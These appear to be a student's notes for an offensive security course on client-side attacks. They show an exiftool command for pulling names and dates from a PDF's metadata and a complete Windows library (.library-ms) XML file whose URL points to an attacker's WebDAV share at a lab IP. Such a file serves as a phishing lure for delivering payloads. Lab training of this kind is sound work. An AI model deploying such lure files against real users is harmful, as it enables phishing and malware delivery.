## Section 11.1 Target Reconnaissance

#### Information Gathering

Examine PDF metadata for names, dates, etc
```
exiftool -a -u brochure.pdf
```

## Section 11.2 Exploiting Microsoft Office

## Section 11.3 Abusing Windows Library Files

Add to Visual Studio Code new text file. Most important tag is the Url tag. Point to webdav share 
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.221</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

```


## Exercises To-Do

- [ ] Kevin (Proving Grounds)
- [ ] Shifty (Proving Grounds)
- [ ] Twiggy (Proving Grounds)